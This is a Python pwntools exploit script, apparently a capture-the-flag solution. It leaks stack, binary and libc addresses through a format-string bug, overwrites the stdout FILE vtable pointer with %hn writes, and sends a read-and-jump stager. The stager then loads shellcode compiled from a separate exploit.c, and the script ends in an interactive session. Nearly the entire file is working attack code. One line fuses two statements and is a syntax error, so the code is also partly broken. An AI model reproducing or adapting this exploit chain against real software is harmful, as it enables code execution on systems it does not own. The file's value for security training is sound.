#!/usr/bin/python
from pwn import *
import cshc
context("amd64", "linux")
r = process("./start.sh")
#r = remote("202.112.26.107", 10910)
raw_input(">")

r.sendline("guest")
r.sendline("guest123")

#menu
r.sendline("2")
r.sendline("A" * 256)

#rootlogin
r.sendline("4")

#stack leak
buf = ""
buf += "%75$lx %74$lx %79$lx"
assert not "\n" in buf
assert len(buf) <= 256
r.sendline(buf)
r.sendline("password")
r.recvuntil("Your choice: Login: Password: ")

values = r.recvuntil("login failed.").split(" ")
base = int(values[0], 16) - 0x12d3
print "base: %x" % base
inputadr = int(values[1], 16) - 0x20 - 0x110
print "inputadr: %x" % inputadr
libc_base = int(values[2], 16) - 245 - 0x21dd0
print "libcbase: %x" % libc_base
print_flag = base + 0xfb3
stdout = libc_base + 0x00000000003bf400
print "stdout: %x" % stdout
vtable = stdout + 216

#overwrite vtable ptr
buf = ""
cnt = 0
data = p64(inputadr)
idx = 8 + 2 * len(data)
for ch in data:
    fmt = ""
    if ord(ch) > (cnt & 0xff):
        fmt = "%{}c".format(ord(ch) - (cnt & 0xff))
        cnt += ord(ch) - (cnt & 0xff)
    elif ord(ch) < (cnt & 0xff):
        fmt = "%{}c".format(0x100 + ord(ch) - (cnt & 0xff))
        cnt += 0x100 + ord(ch) - (cnt & 0xff)

    fmt += "%{}$hn".format(idx)
    if len(fmt) % 16 != 0:
        appendl = 16 - len(fmt)
        fmt += " " * appendl
        cnt += appendl
    buf += fmt
    idx += 1

addr = vtable
for i in range(len(data)):
    buf += p64(addr)
    addr += 1

print "vtable: %x" % vtable
print "vtable ptr: %x" % inputadr

assert not "\n" in buf
assert len(buf) <= 256
r.sendline(buf)

#execute shellcode
shellcode = inputadr + 0x40

buf =  "" buf += "A" * 0x38
buf += p64(shellcode)
# stager
buf += flat(asm(r"""
_start:
        xor edi, edi
        mov edx, 8192
        sub rsp, rdx
        mov rsi, rsp
        xor eax, eax
        syscall
        jmp rsi
"""))
assert not "\n" in buf
assert len(buf) <= 256
r.sendline(buf)

r.recvuntil("Login: Password: ")
shellcode = cshc.arch("x86_64").compile(open("exploit.c", "r").read().replace("LIBC_BASE", str(libc_base)))
assert len(shellcode) <= 8192
r.send(shellcode)
r.interactive()
